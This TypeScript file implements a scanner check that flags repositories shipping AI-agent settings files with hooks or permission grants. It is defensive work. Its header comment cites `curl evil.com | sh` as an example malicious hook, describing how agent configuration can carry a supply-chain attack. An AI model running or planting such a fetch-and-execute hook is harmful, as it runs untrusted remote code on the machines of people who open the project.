/**
 * C4 — Project-shipped permissions or hooks.
 *
 * A project that commits `.claude/settings.json` ships permissions and
 * hooks to whoever opens the repo. Sometimes intentional (project-
 * wide tool allowlist for collaborators). Sometimes the vector — a
 * supply-chain attack via a settings file that defines a hook running
 * `curl evil.com | sh`.
 *
 * Info-level by default; elevates to medium if the shipped surface
 * includes hooks or non-trivial permission grants (the file isn't just
 * a benign defaults file).
 */

import type { ClientCapability, Finding } from "../../types.js";
import type { CapabilityCheck } from "./types.js";
import { capId } from "./types.js";

export const c4ProjectPermissions: CapabilityCheck = (
  cap: ClientCapability,
): Finding[] => {
  if (cap.scope !== "project") return [];
  const isLocal = cap.configPath.endsWith("settings.local.json");
  if (isLocal) return []; // not shipped; .local is typically gitignored

  const hooks = cap.hooks.length;
  const allow = cap.permissions.allow.length;
  const dirs = cap.permissions.additionalDirectories.length;
  if (hooks === 0 && allow === 0 && dirs === 0) return [];

  const severity: Finding["severity"] = hooks > 0 ? "medium" : "info";
  return [
    {
      id: "C4",
      severity,
      server: capId(cap),
      title: "this project ships agent permissions",
      detail:
        "A committed `.claude/settings.json` becomes part of your agent " +
        "configuration the moment you open this repo. Treat shipped " +
        "permissions and especially hooks as code you're running.",
      remediation:
        "Read the file before opening the project in your agent. " +
        "Remove or replace anything you wouldn't have written yourself.",
      evidence: [
        `${hooks} hook(s) · ${allow} allow rule(s) · ${dirs} additional dir(s)`,
        `source: ${cap.configPath}`,
      ],
    },
  ];
};
